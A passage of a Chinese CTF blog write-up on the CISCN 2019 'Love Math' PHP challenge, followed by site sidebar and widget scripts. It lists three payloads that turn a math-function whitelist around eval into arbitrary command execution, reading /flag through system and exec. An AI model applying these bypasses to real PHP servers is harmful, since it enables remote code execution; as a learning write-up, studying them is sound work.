class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$content.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">代码执行！！</span><br><span class="line">让我想起来以前做的一道题了！；</span><br><span class="line">全国工业互联网安全技术技能大赛部分wp</span><br><span class="line">web题 SimpleCalculator</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="payload1"><a href="#payload1" class="headerlink" title="payload1:"></a>payload1:</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));$pi=$$pi;$pi&#123;<span class="number">0</span>&#125;($pi&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
+
+<p>当时的理解：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$pi=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">他就是个_GET</span><br><span class="line">然后$pi=$$pi;</span><br><span class="line">变成$_GET</span><br><span class="line">$pi&#123;<span class="number">0</span>&#125;($pi&#123;<span class="number">1</span>&#125;)</span><br><span class="line">相当于</span><br><span class="line">$_GET[]/&#123;<span class="number">0</span>&#125;   这里相当于设置了<span class="number">2</span>个get传参！</span><br><span class="line">&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag      %<span class="number">20</span>是空格</span><br><span class="line">system(cat%<span class="number">20</span>/flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">就是通过白名单里的数学函数！来构造shell或者直接命令执行！！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">今天看看原理！！</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210614.png" alt="image-20210101213036821"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">注意他这里是eval(&#39;echo &#39;.$content.&#39;;&#39;);	</span><br><span class="line">是可以拼接的代码执行的！！</span><br></pre></td></tr></table></figure>
+
+<h4 id="payload2"><a href="#payload2" class="headerlink" title="payload2:"></a>payload2:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">还看到一种payload：</span><br><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;tac &#x2F;flag</span><br><span class="line"></span><br><span class="line">base_convert— 在 任意进制之间转换数字</span><br><span class="line">如下：从二进制转成十进制！</span><br><span class="line">base_convert(37907361743,10,36)</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210615.png" alt="image-20210101212143369"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210616.png" alt="image-20210101212544192"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dechex — 十进制转换为十六进制</span><br><span class="line">echo dechex(1598506324);5f474554</span><br><span class="line">转换成hex2bin(5f474554) 是 _GET</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210617.png" alt="image-20210101212748388"></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/laowang2915/article/details/77092604">GET请求中参数分隔符分号（;）和and符（&amp;）分隔参数的区别</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)</span><br><span class="line"></span><br><span class="line">($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_GET&#123;pi&#125;(($_GET)&#123;abs&#125;)</span><br><span class="line"></span><br><span class="line">五日看到了！大佬的 tac flag </span><br><span class="line"></span><br><span class="line">$pi&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi&#x3D;system&amp;abs&#x3D;tac &#x2F;flag</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210618.png" alt="image-20210103202043620"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210619.png" alt="image-20210103203223752"></p>
+<p>上面3种情况都可以运行！</p>
+<h4 id="payload3"><a href="#payload3" class="headerlink" title="payload3:"></a>payload3:</h4><p>看到大佬的写发，又学到了！：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getallheaders — 获取全部 HTTP 请求头信息</span><br><span class="line"></span><br><span class="line">$pi&#x3D;base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</span><br><span class="line"></span><br><span class="line">直接搬运大佬的：</span><br><span class="line">base_convert(696468,10,36) &#x3D;&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) &#x3D;&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br><span class="line">&#x2F;&#x2F;操作xx和yy，中间用逗号隔开，echo都能输出</span><br><span class="line">echo xx,yy</span><br><span class="line"></span><br><span class="line">刚开始以为exec没有回显不能返回前端页面数据！！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210620.png" alt="image-20210103204621674"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">uploads</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://tanchiyu.top/2021/01/01/BUUCTF-2/">https://tanchiyu.top/2021/01/01/BUUCTF-2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://tanchiyu.top" target="_blank">Tcy👦♥QQ👧</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%AF%92%E5%81%87CTF-DAY-01/">寒假CTF DAY 01</a><a class="post-meta__tags" href="/tags/BUUCTF/">BUUCTF</a><a class="post-meta__tags" href="/tags/SSRF/">SSRF</a><a class="post-meta__tags" href="/tags/http-Header%E8%AF%B7%E6%B1%82%E5%A4%B4/">http Header请求头</a><a class="post-meta__tags" href="/tags/XML/">XML</a><a class="post-meta__tags" href="/tags/Unicode%E7%AD%89%E4%BB%B7%E6%80%A7%E6%B5%85%E8%B0%88/">Unicode等价性浅谈</a><a class="post-meta__tags" href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP代码审计</a><a class="post-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0/">代码执行(数学函数)</a></div><div class="post_share"><div class="social-share" data-image="/image/ttt.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/01/01/Docker/"><img class="prev-cover" data-lazy-src="/image/docker01.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Docker</div></div></a></div><div class="next-post pull-right"><a href="/2021/01/01/BMZCTF%E5%AD%A6%E4%B9%A0/"><img class="next-cover" data-lazy-src="/image/1.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">BMZCTF学习</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/01/BMZCTF学习/" title="BMZCTF学习"><img class="cover" data-lazy-src="/image/1.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-01</div><div class="title">BMZCTF学习</div></div></a></div><div><a href="/2021/01/03/BUUCTF-3/" title="BUUCTF3"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-03</div><div class="title">BUUCTF3</div></div></a></div><div><a href="/2021/01/29/BUUCTF-19/" title="BUUCTF19"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-29</div><div class="title">BUUCTF19</div></div></a></div><div><a href="/2021/01/25/SSRF学习/" title="SSRF学习"><img class="cover" data-lazy-src="/image/236.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-25</div><div class="title">SSRF学习</div></div></a></div><div><a href="/2021/01/09/BUUCTF-8/" title="BUUCTF8"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-09</div><div class="title">BUUCTF8</div></div></a></div><div><a href="/2021/01/15/BUUCTF-9/" title="BUUCTF9"><img class="cover" data-lazy-src="/image/ttt.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-15</div><div class="title">BUUCTF9</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">uploads</div><div class="author-info__description">每天都要开心</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://tcyba.github.io/"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tcyba" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:2384372932@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">我希望我以后每天都能开开心心！</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#De1CTF-2019-SSRF-Me"><span class="toc-number">1.</span> <span class="toc-text">[De1CTF 2019]SSRF Me</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">payload：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BJDCTF-2nd-%E5%81%87%E7%8C%AA%E5%A5%97%E5%A4%A9%E4%B8%8B%E7%AC%AC%E4%B8%80"><span class="toc-number">2.</span> <span class="toc-text">[BJDCTF 2nd]假猪套天下第一</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#http-header%E5%A4%B4"><span class="toc-number">2.0.1.</span> <span class="toc-text">http header头</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">3.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5payload%EF%BC%9A"><span class="toc-number">3.0.1.</span> <span class="toc-text">直接payload：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%AC%E8%99%AB%E7%9A%84%E5%8C%85%E7%A0%94%E7%A9%B6%E5%8D%8A%E5%A4%A9%EF%BC%8C%E4%B8%80%E5%BC%80%E5%A7%8B%E8%80%81%E6%98%AF%E8%BF%90%E8%A1%8C%E4%B8%8D%E4%BA%86%EF%BC%81"><span class="toc-number">3.0.2.</span> <span class="toc-text">爬虫的包研究半天，一开始老是运行不了！</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ASIS-2019-Unicorn-shop"><span class="toc-number">4.</span> <span class="toc-text">[ASIS 2019]Unicorn shop</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Unicode"><span class="toc-number">4.0.1.</span> <span class="toc-text">Unicode</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math"><span class="toc-number">5.</span> <span class="toc-text">[CISCN 2019 初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload1"><span class="toc-number">5.0.1.</span> <span class="toc-text">payload1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload2"><span class="toc-number">5.0.2.</span> <span class="toc-text">payload2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload3"><span class="toc-number">5.0.3.</span> <span class="toc-text">payload3:</span></a></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="hackme靶场"/></a><div class="content"><a class="title" href="/2021/02/06/hackme%E9%9D%B6%E5%9C%BA/" title="hackme靶场">hackme靶场</a><time datetime="2021-02-06T13:26:18.000Z" title="发表于 2021-02-06 21:26:18">2021-02-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pikachu靶场"/></a><div class="content"><a class="title" href="/2021/02/05/Pikachu%E9%9D%B6%E5%9C%BA/" title="Pikachu靶场">Pikachu靶场</a><time datetime="2021-02-05T06:35:59.000Z" title="发表于 2021-02-05 14:35:59">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="工具学习"/></a><div class="content"><a class="title" href="/2021/02/05/%E5%B7%A5%E5%85%B7%E5%AD%A6%E4%B9%A0/" title="工具学习">工具学习</a><time datetime="2021-02-05T03:48:26.000Z" title="发表于 2021-02-05 11:48:26">2021-02-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/02/BUUCTF-22/" title="无题"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/2021/02/02/BUUCTF-22/" title="无题">无题</a><time datetime="2021-02-02T03:00:17.000Z" title="发表于 2021-02-02 11:00:17">2021-02-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21"><img data-lazy-src="/image/ttt.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="BUUCTF21"/></a><div class="content"><a class="title" href="/2021/02/01/BUUCTF-21/" title="BUUCTF21">BUUCTF21</a><time datetime="2021-02-01T06:14:07.000Z" title="发表于 2021-02-01 14:14:07">2021-02-01</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/2.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By uploads</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.spacingElementById('content-inner')
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.spacingElementById('content-inner')
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    loader: {
+      source: {
+        '[tex]/amsCd': '[tex]/amscd'
+      }
+    },
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        addClass: [200,() => {
+          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
+            const target = node.parentNode
+            if (!target.classList.contains('has-jax')) {
+              target.classList.add('mathjax-overflow')
+            }
+          })
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex-copytex@latest/dist/katex-copytex.min.css"><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', '', 'katex-wrap')
+  })
+})()</script><script>if (document.getElementsByClassName('mermaid').length) {
+  if (window.mermaidJsLoad) mermaid.init()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
+      window.mermaidJsLoad = true
+      mermaid.initialize({
+        theme: 'neutral',
+      })
+      false && mermaid.init()
+    })
+  }
+}</script><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'en',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !true) {
+  if (true) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://tanchiyu.top/2021/01/01/BUUCTF-2/'
+    this.page.identifier = '2021/01/01/BUUCTF-2/'
+    this.page.title = 'BUUCTF2'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://你的disqus的 short-name.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+}
+
+if ('Valine' === 'Disqus' || !true) {
+  if (true) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><canvas class="fireworks" mobile="true"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/haruto.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
